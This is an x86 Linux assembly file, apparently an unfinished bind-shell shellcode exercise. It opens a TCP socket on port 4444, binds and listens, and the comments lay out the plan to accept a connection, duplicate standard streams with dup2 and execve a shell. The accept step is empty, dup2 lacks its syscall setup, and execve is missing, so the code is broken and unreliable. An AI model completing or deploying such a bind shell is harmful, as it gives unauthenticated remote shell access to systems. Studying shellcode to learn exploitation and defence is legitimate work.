;   syscalls that i'll need:
;   !!values are passing by int!!
;   
;   socket() -> 359
;       AF_INET		2
;       SOCKET_STREAM    1
;       protocol 0
;
;   bind() -> 361
;       eax -> fd
;       struct sockaddr
;           0 -> all interfaces(INADDR_ANY)
;           word 0x5c11 -> port number
;           word 0x02 -> AF_INET
;       16 -> sizeof(struct)
;           
;   listen() -> 363
;       sockfd
;       0
;   
;   accept() -> 364
;           
;   dup2()
;   execve()

global _start

section .text
        _start:
        ; set needed registers to zero
        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        xor edx, edx

        ;   ebx, ecx, edx, esi, edi, ebp
        ;   int socket(int domain, int type, int protocol);
        ;
        mov ebx, 2 ; AF_INET value from https://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/socket.h.html
        mov ecx, 1  ; SOCKET_STREAM value from the site above      
        mov eax, 359 ; sys_socket, protocol is not set because it is 0
        
        int 0x80 ; call kernel

        ;   int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
        ;
        mov ebx, eax ; put the return value from sys_socket in ebx
        push edx ; ANNY_ADDR value
        push word 0x5c11 ; htos(4444) port in little endian
        push word 0x02 ; AF_INET again and stack alignment
        mov ecx, esp  ; point the top of the stack or the first element of struct sockaddr
        mov edx, 16 ; #define __SOCK_SIZE__ 16 sizeof(struct sockaddr)
        mov eax, 361 ; sys_bind()
        
        int 0x80 ; call kernel

        ; int listen(int sockfd, int backlog);
        ;
        ; sockfd is already in ebx
        xor ecx,ecx ; set ecx to zero
        mov eax, 363 ; listen syscall

        int 0x80 ; call kernel

        ;   int accept(int sockfd, struct sockaddr *_Nullable restrict addr,socklen_t *_Nullable restrict addrlen);
        ; we are pass null in all args except for sockfd



        ;  int dup2(int oldfd, int newfd);
        ;
        mov ebx, eax ; get the new fd from accept()
        mov ecx, 3 ; set all 3 fd (stdin, stdout, error)

        
        int 0x80 ;  dup 

               

section .data

